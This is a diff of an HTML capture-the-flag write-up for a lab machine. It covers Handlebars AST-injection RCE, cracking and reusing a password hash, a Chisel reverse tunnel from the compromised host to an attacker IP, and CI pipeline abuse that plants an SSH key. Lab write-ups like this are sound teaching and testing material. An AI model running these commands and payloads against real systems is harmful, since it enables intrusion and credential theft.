-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;08&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Local privesc&lt;/b&gt;
-        &lt;em&gt;GodPotato (SeImpersonatePrivilege) → NT AUTHORITY\SYSTEM&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s9&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 9: Domain compromise&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;09&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Domain compromise&lt;/b&gt;
-        &lt;em&gt;DCSync of darkzero.ext, blocked at the forest-trust boundary&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s10&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 10: Cross-forest attack&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;10&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Cross-forest attack&lt;/b&gt;
-        &lt;em&gt;SID-filtering bypass via a high-RID group nested in Backup Operators&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-&lt;div class=&quot;rail-node&quot; data-target=&quot;s11&quot; tabindex=&quot;0&quot; role=&quot;button&quot; aria-label=&quot;Jump to stage 11: Objective&quot;&gt;
-      &lt;span class=&quot;rail-dot&quot;&gt;&lt;span class=&quot;rail-dot-num&quot;&gt;11&lt;/span&gt;&lt;/span&gt;
-      &lt;span class=&quot;rail-label&quot;&gt;
-        &lt;b&gt;Objective&lt;/b&gt;
-        &lt;em&gt;raw SMB2 read with FILE_OPEN_FOR_BACKUP_INTENT → root.txt on DC01.darkzero.htb&lt;/em&gt;
-      &lt;/span&gt;
-    &lt;/div&gt;
-    &lt;/div&gt;
-  &lt;/nav&gt;
-
-  &lt;main class=&quot;main-col&quot;&gt;
-
-    &lt;section class=&quot;overview&quot;&gt;
-      &lt;h2 class=&quot;block-title&quot;&gt;Document Overview&lt;/h2&gt;
-      &lt;div class=&quot;overview-grid&quot;&gt;
-        &lt;div class=&quot;tldr-card&quot;&gt;
-          &lt;span class=&quot;label&quot;&gt;TL;DR&lt;/span&gt;
-          &lt;p&gt;Unauthenticated Node.js campaign manager to Domain Admin on two trusted Active Directory forests. The chain runs through a Handlebars AST-injection RCE, a cracked database hash reused on a domain account, a Chisel reverse-tunnel pivot into a DNS-less internal segment, a CI/CD trust-confusion bug in Gitea (twice, via two different primitives), a local privilege escalation with GodPotato, a DCSync blocked at the forest-trust boundary, and finally a SID-filtering bypass across a TREAT_AS_EXTERNAL forest trust to read root.txt off the second forest&amp;#x27;s domain controller using raw SMB2 backup semantics.&lt;/p&gt;
-        &lt;/div&gt;
-        &lt;div class=&quot;side-cards&quot;&gt;
-          &lt;div class=&quot;mini-card&quot;&gt;
-            &lt;span class=&quot;label&quot;&gt;Tools Used&lt;/span&gt;
-            &lt;p&gt;nmap, Handlebars (manual AST crafting), hashcat, ssh, Chisel, proxychains4, faketime, curl (SPNEGO), Gitea Actions, impacket (ticketer, lookupsid, secretsdump, smbconnection), BloodHound, NetExec (nxc), GodPotato.&lt;/p&gt;
-          &lt;/div&gt;
-          &lt;div class=&quot;mini-card credential&quot;&gt;
-            &lt;span class=&quot;label&quot;&gt;Credential Note&lt;/span&gt;
-            &lt;p&gt;Every credential-bearing screenshot in this write-up — hashcat, secretsdump, lookupsid (x2), and nxc smb/ldap — confirms josh&amp;#x27;s working password as Rangers1. ISP1337Hackers does not appear anywhere in the evidence; it is most likely the password used to self-register on the campaign-manager app in Stage 1, not josh&amp;#x27;s domain credential. Rangers1 is used throughout.&lt;/p&gt;
-          &lt;/div&gt;
-        &lt;/div&gt;
-      &lt;/div&gt;
-      &lt;ul class=&quot;chain-list&quot;&gt;
-        &lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;01&lt;/span&gt;&lt;span&gt;&lt;b&gt;Recon&lt;/b&gt; — virtual host discovery, dzcampaigns.htb&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;02&lt;/span&gt;&lt;span&gt;&lt;b&gt;Initial access&lt;/b&gt; — Handlebars AST injection (CVE-2026-58443) → RCE as darkzero&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;03&lt;/span&gt;&lt;span&gt;&lt;b&gt;Credential access&lt;/b&gt; — MySQL bcrypt hash cracked with hashcat, reused on domain account josh&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;04&lt;/span&gt;&lt;span&gt;&lt;b&gt;Pivoting&lt;/b&gt; — Chisel reverse tunnel into the DNS-less 172.16.20.0/24 segment&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;05&lt;/span&gt;&lt;span&gt;&lt;b&gt;Lateral movement&lt;/b&gt; — Kerberos/SPNEGO auth to an internal Gitea instance&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;06&lt;/span&gt;&lt;span&gt;&lt;b&gt;CI/CD privesc — round 1&lt;/b&gt; — reversed pull-request workflow trigger → shell as svc-runner&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;07&lt;/span&gt;&lt;span&gt;&lt;b&gt;CI/CD privesc — round 2&lt;/b&gt; — Windows path-normalization + git clean-filter RCE (CVE-2026-22547) → shell as svc-gitea&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;08&lt;/span&gt;&lt;span&gt;&lt;b&gt;Local privesc&lt;/b&gt; — GodPotato (SeImpersonatePrivilege) → NT AUTHORITY\SYSTEM&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;09&lt;/span&gt;&lt;span&gt;&lt;b&gt;Domain compromise&lt;/b&gt; — DCSync of darkzero.ext, blocked at the forest-trust boundary&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;10&lt;/span&gt;&lt;span&gt;&lt;b&gt;Cross-forest attack&lt;/b&gt; — SID-filtering bypass via a high-RID group nested in Backup Operators&lt;/span&gt;&lt;/li&gt;
-&lt;li&gt;&lt;span class=&quot;chain-idx&quot;&gt;11&lt;/span&gt;&lt;span&gt;&lt;b&gt;Objective&lt;/b&gt; — raw SMB2 read with FILE_OPEN_FOR_BACKUP_INTENT → root.txt on DC01.darkzero.htb&lt;/span&gt;&lt;/li&gt;
-      &lt;/ul&gt;
-    &lt;/section&gt;
-
-    &lt;section class=&quot;stage&quot; id=&quot;s1&quot; data-num=&quot;01&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;01&lt;/span&gt;
-        &lt;h2&gt;Recon&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;pre class=&quot;term&quot;&gt;&lt;code&gt;sudo nmap -p- --min-rate 10000 -n -Pn -oA nmap/darkzeroreturns_tcp.htb 10.129.59.3
+<p>01<br>        <br></p><h2 id="sec-1-recon">Recon</h2><p></p>
+<p></p><pre><code>sudo nmap -p- --min-rate 10000 -n -Pn -oA nmap/darkzeroreturns_tcp.htb 10.129.59.3
 
 22/tcp open  ssh
 80/tcp open  http
 
 sudo nmap -sU -p 1-65535 --min-rate 10000 -oA nmap/darkzeroreturns_udp 10.129.59.3
---Nothing--&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Port 80 redirects to dzcampaigns.htb. The Ubuntu/nginx banner and general behavior suggested a domain-joined Linux box rather than a plain web server.&lt;/p&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;echo &amp;quot;10.129.59.3 dzcampaigns.htb&amp;quot; | sudo tee -a /etc/hosts&lt;/code&gt;&lt;/pre&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s2&quot; data-num=&quot;02&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;02&lt;/span&gt;
-        &lt;h2&gt;Initial access — Handlebars AST injection (CVE-2026-58443)&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;registering an account&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-01.jpg&quot; alt=&quot;registering an account&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;registering an account&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;campaign manager app&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-02.jpg&quot; alt=&quot;campaign manager app&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;campaign manager app&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;custom campaign message field&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-03.jpg&quot; alt=&quot;custom campaign message field&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;custom campaign message field&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;p&gt;The campaign manager&amp;#x27;s &amp;quot;Custom Campaign Message&amp;quot; field compiles user input with Handlebars:&lt;/p&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;if (customMessage) {
+--Nothing--</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>Port 80 redirects to dzcampaigns.htb. The Ubuntu/nginx banner and general behavior suggested a domain-joined Linux box rather than a plain web server.</p>
+<p></p><pre><code>echo "10.129.59.3 dzcampaigns.htb" | sudo tee -a /etc/hosts</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+
+<p>02<br>        <br></p><h2 id="sec-2-initial-access-handlebars-ast-injection-cve-2026-58443">Initial access — Handlebars AST injection (CVE-2026-58443)</h2><p></p>
+<p><img src="images/darkzero-01.jpg" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p><img src="images/darkzero-02.jpg" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p><img src="images/darkzero-03.jpg" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p>The campaign manager's "Custom Campaign Message" field compiles user input with Handlebars:</p>
+<p></p><pre><code>if (customMessage) {
   const compiled = Handlebars.compile(customMessage);
   message = compiled();
-}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The real bug is not classic SSTI — the JSON parser accepts an object in place of a string, and Handlebars treats that object as an already-parsed AST. Handing it a crafted syntax tree gets an unquoted value copied straight into generated JavaScript:&lt;/p&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;{
-  &amp;quot;type&amp;quot;: &amp;quot;Program&amp;quot;,
-  &amp;quot;body&amp;quot;: [
+}</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>The real bug is not classic SSTI — the JSON parser accepts an object in place of a string, and Handlebars treats that object as an already-parsed AST. Handing it a crafted syntax tree gets an unquoted value copied straight into generated JavaScript:</p>
+<p></p><pre><code>{
+  "type": "Program",
+  "body": [
     {
-      &amp;quot;type&amp;quot;: &amp;quot;MustacheStatement&amp;quot;,
-      &amp;quot;path&amp;quot;: {&amp;quot;type&amp;quot;: &amp;quot;PathExpression&amp;quot;, &amp;quot;parts&amp;quot;: [&amp;quot;lookup&amp;quot;], &amp;quot;original&amp;quot;: &amp;quot;lookup&amp;quot;, &amp;quot;depth&amp;quot;: 0, &amp;quot;data&amp;quot;: false},
-      &amp;quot;params&amp;quot;: [ {&amp;quot;type&amp;quot;: &amp;quot;PathExpression&amp;quot;, &amp;quot;parts&amp;quot;: [], &amp;quot;original&amp;quot;: &amp;quot;this&amp;quot;, &amp;quot;depth&amp;quot;: 0, &amp;quot;data&amp;quot;: false}, ... ]
+      "type": "MustacheStatement",
+      "path": {"type": "PathExpression", "parts": ["lookup"], "original": "lookup", "depth": 0, "data": false},
+      "params": [ {"type": "PathExpression", "parts": [], "original": "this", "depth": 0, "data": false}, ... ]
     }
   ]
-}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sending that object as &lt;code&gt;campaign_message&lt;/code&gt; while updating a character yields RCE as darkzero. Reusable exploit: &lt;code&gt;exploit_hb_revshell.py&lt;/code&gt;.&lt;/p&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s3&quot; data-num=&quot;03&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;03&lt;/span&gt;
-        &lt;h2&gt;Cracking josh&amp;#x27;s password&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;p&gt;MySQL was reachable from the RCE and held a bcrypt hash for a user named josh.&lt;/p&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;hashcat -m 3200 josh.hash /usr/share/wordlists/rockyou.txt
+}</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>Sending that object as <code>campaign_message</code> while updating a character yields RCE as darkzero. Reusable exploit: <code>exploit_hb_revshell.py</code>.</p>
+
+<p>03<br>        <br></p><h2 id="sec-3-cracking-josh-s-password">Cracking josh's password</h2><p></p>
+<p>MySQL was reachable from the RCE and held a bcrypt hash for a user named josh.</p>
+<p></p><pre><code>hashcat -m 3200 josh.hash /usr/share/wordlists/rockyou.txt
 
 $2b$10$kX7QP3jPIQIShxJWV4a0HpO7UcdstuwLxPS1LhHPFPSceATiOKmVbK:Rangers1
 Session..........: hashcat
-Status...........: Cracked&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The same password works for josh&amp;#x27;s actual domain account (the Linux box is domain-joined to darkzero.ext):&lt;/p&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;SSH login as josh — SRV01, domain-joined to darkzero.ext&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-04.png&quot; alt=&quot;SSH login as josh — SRV01, domain-joined to darkzero.ext&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;SSH login as josh — SRV01, domain-joined to darkzero.ext&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;ssh josh@10.129.59.3
+Status...........: Cracked</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>The same password works for josh's actual domain account (the Linux box is domain-joined to darkzero.ext):</p>
+<p><img src="images/darkzero-04.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>ssh josh@10.129.59.3
 Password: Rangers1
 
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)
 ...
 IPv4 address for eth0: 172.16.20.3
 Last login: ... from 172.16.20.1
-josh@SRV01:~$&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The eth0 address (172.16.20.3) confirms SRV01 has a leg into an internal, DNS-less segment (172.16.20.0/24) that isn&amp;#x27;t reachable from outside — that&amp;#x27;s the pivot target.&lt;/p&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s4&quot; data-num=&quot;04&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;04&lt;/span&gt;
-        &lt;h2&gt;Pivoting — Chisel&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;p&gt;On SRV01, as josh:&lt;/p&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;downloading and running the Chisel client on SRV01&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-05.png&quot; alt=&quot;downloading and running the Chisel client on SRV01&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;downloading and running the Chisel client on SRV01&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;cd /tmp
+josh@SRV01:~$</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>The eth0 address (172.16.20.3) confirms SRV01 has a leg into an internal, DNS-less segment (172.16.20.0/24) that isn't reachable from outside — that's the pivot target.</p>
+
+<p>04<br>        <br></p><h2 id="sec-4-pivoting-chisel">Pivoting — Chisel</h2><p></p>
+<p>On SRV01, as josh:</p>
+<p><img src="images/darkzero-05.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>cd /tmp
 wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_linux_amd64.gz
 gunzip chisel_1.10.1_linux_amd64.gz
 chmod +x chisel_1.10.1_linux_amd64
 sudo mv chisel_1.10.1_linux_amd64 /usr/local/bin/chisel
-# -&amp;gt; wget fails: &amp;#x27;Temporary failure in name resolution&amp;#x27; (no outbound DNS)
-# -&amp;gt; sudo fails: josh is not in the sudoers file
+# -&gt; wget fails: 'Temporary failure in name resolution' (no outbound DNS)
+# -&gt; sudo fails: josh is not in the sudoers file
 
 # workaround: fetch chisel on the attack box instead, then scp/http-serve it across,
 # and just chmod +x /tmp/chisel (no sudo/system install needed)
@@ -3795,19 +3216,11 @@ chmod +x /tmp/chisel
 /tmp/chisel client 10.10.15.14:8888 R:socks
 
 client: Connecting to ws://10.10.15.14:8888
-client: Connected (latency 68.8355ms)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On the attack box:&lt;/p&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;chisel --help on the attack box&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-06.png&quot; alt=&quot;chisel --help on the attack box&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;chisel --help on the attack box&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;chisel reverse server listening&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-07.png&quot; alt=&quot;chisel reverse server listening&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;chisel reverse server listening&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;wget https://github.com/jpillora/chisel/releases/download/v1.11.8/chisel_1.11.8_linux_amd64.gz
+client: Connected (latency 68.8355ms)</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>On the attack box:</p>
+<p><img src="images/darkzero-06.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p><img src="images/darkzero-07.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>wget https://github.com/jpillora/chisel/releases/download/v1.11.8/chisel_1.11.8_linux_amd64.gz
 gunzip chisel_1.11.8_linux_amd64.gz
 chmod +x chisel_1.11.8_linux_amd64
 sudo mv chisel_1.11.8_linux_amd64 /usr/local/bin/chisel
@@ -3817,62 +3230,38 @@ sudo mv chisel_1.11.8_linux_amd64 /usr/local/bin/chisel
 server: Reverse tunnelling enabled
 server: Fingerprint tlb99dh2w63sCuOTvOX1gngA21MX8NPA3YAKSOYS3NM=
 server: Listening on http://0.0.0.0:8888
-server: session#1: tun: proxy#R:127.0.0.1:1080=&amp;gt;socks: Listening&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With the reverse SOCKS proxy up on 127.0.0.1:1080, proxychains4 (pointed at that SOCKS5 listener) routes traffic into 172.16.20.0/24. An fping/nmap sweep through the tunnel turns up DC02.darkzero.ext (172.16.20.2) and DC01.darkzero.htb (172.16.20.1) — the second, HTB-side forest, added to /etc/hosts.&lt;/p&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s5&quot; data-num=&quot;05&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;05&lt;/span&gt;
-        &lt;h2&gt;Kerberos against internal Gitea&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;p&gt;Port 3000 on DC02 is an internal Gitea instance, reachable only through the tunnel and only via Kerberos/SPNEGO — no local auth is exposed. A kinit for josh (against DARKZERO.EXT) plus faketime (to correct clock skew across the tunnel, which Kerberos won&amp;#x27;t tolerate) gets a usable ticket:&lt;/p&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; kinit josh@DARKZERO.EXT
-klist&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;SPNEGO curl against the Gitea Actions API&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-08.png&quot; alt=&quot;SPNEGO curl against the Gitea Actions API&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;SPNEGO curl against the Gitea Actions API&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;KRB5_CONFIG=/tmp/dzr.conf faketime &amp;#x27;+7 hours&amp;#x27; proxychains4 -q curl --negotiate -u : -s \
-  &amp;quot;http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/actions/tasks&amp;quot; \
-  | python3 -m json.tool&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The response lists prior workflow_runs, several already showing &lt;code&gt;event: pull_request_review_comment&lt;/code&gt;, &lt;code&gt;workflow_id: foothold.yml&lt;/code&gt;, &lt;code&gt;status: success&lt;/code&gt; — evidence the same CI trust-confusion primitive had been exercised before this run.&lt;/p&gt;
-      &lt;/div&gt;
-    &lt;/section&gt;
-&lt;section class=&quot;stage&quot; id=&quot;s6&quot; data-num=&quot;06&quot;&gt;
-      &lt;div class=&quot;stage-head&quot;&gt;
-        &lt;span class=&quot;stage-num&quot;&gt;06&lt;/span&gt;
-        &lt;h2&gt;The reversed pull request (CI/CD, round 1)&lt;/h2&gt;
-      &lt;/div&gt;
-      &lt;div class=&quot;stage-body&quot;&gt;
-        &lt;p&gt;Gitea Actions here trusts the operation, not the requester&amp;#x27;s underlying push rights. Forking the repo gives full push rights on the fork; a workflow that fires on &lt;code&gt;pull_request_review_comment&lt;/code&gt; (instead of a plain push) plants an SSH key for the runner&amp;#x27;s real account when a PR review comment lands on a PR into the protected upstream repo:&lt;/p&gt;&lt;pre class=&quot;term&quot;&gt;&lt;code&gt;# 1. kinit as josh
+server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>With the reverse SOCKS proxy up on 127.0.0.1:1080, proxychains4 (pointed at that SOCKS5 listener) routes traffic into 172.16.20.0/24. An fping/nmap sweep through the tunnel turns up DC02.darkzero.ext (172.16.20.2) and DC01.darkzero.htb (172.16.20.1) — the second, HTB-side forest, added to /etc/hosts.</p>
+
+<p>05<br>        <br></p><h2 id="sec-5-kerberos-against-internal-gitea">Kerberos against internal Gitea</h2><p></p>
+<p>Port 3000 on DC02 is an internal Gitea instance, reachable only through the tunnel and only via Kerberos/SPNEGO — no local auth is exposed. A kinit for josh (against DARKZERO.EXT) plus faketime (to correct clock skew across the tunnel, which Kerberos won't tolerate) gets a usable ticket:</p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' kinit josh@DARKZERO.EXT
+klist</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p><img src="images/darkzero-08.png" alt="img" style="max-width:100%;border-radius:4px;border:1px solid var(--border);margin:.8rem 0;display:block"></p>
+<p></p><pre><code>KRB5_CONFIG=/tmp/dzr.conf faketime '+7 hours' proxychains4 -q curl --negotiate -u : -s \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/actions/tasks" \
+  | python3 -m json.tool</code><button class="code-copy-btn" type="button">Copy</button></pre><p></p>
+<p>The response lists prior workflow_runs, several already showing <code>event: pull_request_review_comment</code>, <code>workflow_id: foothold.yml</code>, <code>status: success</code> — evidence the same CI trust-confusion primitive had been exercised before this run.</p>
+
+<p>06<br>        <br></p><h2 id="sec-6-the-reversed-pull-request-ci-cd-round-1">The reversed pull request (CI/CD, round 1)</h2><p></p>
+<p>Gitea Actions here trusts the operation, not the requester's underlying push rights. Forking the repo gives full push rights on the fork; a workflow that fires on <code>pull_request_review_comment</code> (instead of a plain push) plants an SSH key for the runner's real account when a PR review comment lands on a PR into the protected upstream repo:</p>
+<p></p><pre><code># 1. kinit as josh
 # 2. create/reuse DarkZero/pwn-fork (fork of DarkZero/DarkZero-Campaigns)
 # 3. upload a pull_request_review_comment workflow (foothold.yml) to the fork
 # 4. create a fresh commit on fork/main
 # 5. open a normal PR from the fork into DarkZero/DarkZero-Campaigns:main via the Gitea API
 # 6. trigger it by posting a PR review COMMENT (not a push)
-# 7. wait for /tmp/p138_from_runner.txt to confirm the runner executed the fork&amp;#x27;s workflow
+# 7. wait for /tmp/p138_from_runner.txt to confirm the runner executed the fork's workflow
 
-GITEA=&amp;#x27;http://gitea.darkzero.ext:3000&amp;#x27;
-# ... full script: exploit_gitea_pr_reverse.sh&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The workflow, once triggered, has the runner drop an SSH key readable by josh and copy the user flag / Kerberos material into a location the runner account (svc-runner) can reach.&lt;/p&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
-    &lt;div class=&quot;shot-bar&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;shot-path&quot;&gt;confirming SSH is reachable on the target&lt;/span&gt;&lt;/div&gt;
-    &lt;img loading=&quot;lazy&quot; src=&quot;images/darkzero-09.png&quot; alt=&quot;confirming SSH is reachable on the target&quot;&gt;
-  &lt;/div&gt;
-  &lt;figcaption&gt;confirming SSH is reachable on the target&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;figure class=&quot;shot&quot;&gt;
-  &lt;div class=&quot;shot-frame&quot;&gt;
